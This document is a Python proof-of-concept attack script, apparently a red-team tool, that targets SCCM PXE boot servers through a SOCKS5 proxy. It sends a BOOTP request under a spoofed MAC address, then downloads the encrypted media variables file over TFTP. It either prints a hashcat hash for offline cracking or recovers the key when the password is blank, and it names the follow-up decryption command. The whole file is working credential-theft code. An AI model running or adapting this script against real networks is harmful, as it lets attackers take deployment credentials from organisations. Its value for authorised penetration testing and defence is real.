from lib import sccm
from lib import socks, tftp
import argparse

# Parse arguments
parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
parser.add_argument("target", help="SCCM PXE IP")
parser.add_argument("src_ip", help="Source IP")
parser.add_argument("socks_host", help="SOCKS5 proxy host")
parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
args = parser.parse_args()

if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
    print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
    exit()

# Setup SOCKS5 client
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

sccm_client = sccm.SCCM(args.target, 4011, client)
(variables,bcd,cryptokey) = sccm_client.send_bootp_request(args.src_ip, "11:22:33:44:55:66")

print(f"[*] Variables file: {variables}")
print(f"[*] BCD file: {bcd}")

client.close()

# TFTP Limitation over SOCKS5 means we can only grab the first few bytes (we can't ack the request):()
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

tftp_client = tftp.TFTPClient(args.target, 69, client)
data_variables = tftp_client.get_file(variables)

if cryptokey == None:
    hashcat_hash = f"$sccm$aes128${sccm_client.read_media_variable_file_header(data_variables).hex()}"
    print(hashcat_hash)
    print("[*] Try cracking this hash to read the media file")
else:
    print("[*] Blank password on PXE media file found!")
    print("[*] Attempting to decrypt it...")
    decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
    if( decrypt_password ):
        print("[*] Password retrieved: " + decrypt_password.hex())
        
print("[*] Once you have the key, download the variables file from:")
print(f"[*] \\\\{args.target}\\REMINST{variables}")
print("[*] You can then decrypt this with PXEThiefy.py using:")
print("[*] python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")